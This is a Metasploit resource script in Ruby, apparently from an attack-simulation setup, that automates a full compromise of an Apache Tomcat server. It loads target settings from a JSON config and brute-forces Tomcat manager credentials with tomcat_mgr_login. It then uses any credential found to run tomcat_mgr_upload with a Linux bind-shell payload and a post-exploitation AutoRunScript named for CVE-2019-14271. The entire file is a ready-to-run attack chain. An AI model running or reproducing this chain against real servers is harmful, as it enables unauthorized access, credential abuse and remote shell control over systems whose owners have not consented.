<ruby>
	require "json"

	def initialize_from_json(json_data)
		#set workspace name from config file
		framework.datastore["TARGET_IP"] = json_data["TARGET_IP"]
		framework.datastore["TARGET_PORT"] = json_data["TARGET_PORT"]
		framework.datastore["LISTENING_IP"] = json_data["LISTENING_IP"]
		framework.datastore["LPORT"] = json_data["LPORT"]

	end

	datastore = framework.datastore

	json_file = File.read("/data/attacker/custom_attacks/brute_force/config_rc.json")
	json_data = JSON.parse(json_file)
	datastore["WORKSPACE"] = json_data["WORKSPACE"]

	#delete workspace with same name
	run_single("workspace -d #{datastore["WORKSPACE"]}")
	#set workspace to the selected one in config file
	run_single("workspace -a #{datastore["WORKSPACE"]}")
	print_status "USING WORKSPACE #{datastore["WORKSPACE"]}"
	initialize_from_json(json_data)

	run_single("use auxiliary/scanner/http/tomcat_mgr_login")
	run_single("set RHOSTS #{datastore["TARGET_IP"]}")
	run_single("set LHOST #{datastore["LISTENING_IP"]}")
	run_single("set RPORT #{datastore["TARGET_PORT"]}")
	run_single("set STOP_ON_SUCCESS true")
	run_single("run")

	begin
		cred = framework.db.creds.to_ary.find { |cr| cr.logins[0].host.address == datastore["TARGET_IP"] }
	rescue
		print_error("Credential not found")
		return
	end

	run_single("use exploit/multi/http/tomcat_mgr_upload")
	run_single("set payload payload/linux/x86/shell/bind_tcp")
    run_single("set target 2")
	run_single("set fingerprintcheck false")
	run_single("set HttpUsername #{cred.public}")
	run_single("set HttpPassword #{cred.private}")
	run_single("set RHOSTS #{datastore["TARGET_IP"]}")
	run_single("set LHOST #{datastore["LISTENING_IP"]}")
	run_single("set LPORT #{datastore["LPORT"]}")
	run_single("set RPORT #{datastore["TARGET_PORT"]}")
	run_single("set AutoRunScript /data/attacker/custom_attacks/brute_force/CVE-2019-14271_PostExploitScript.sh")
	run_single("exploit -j")
</ruby>
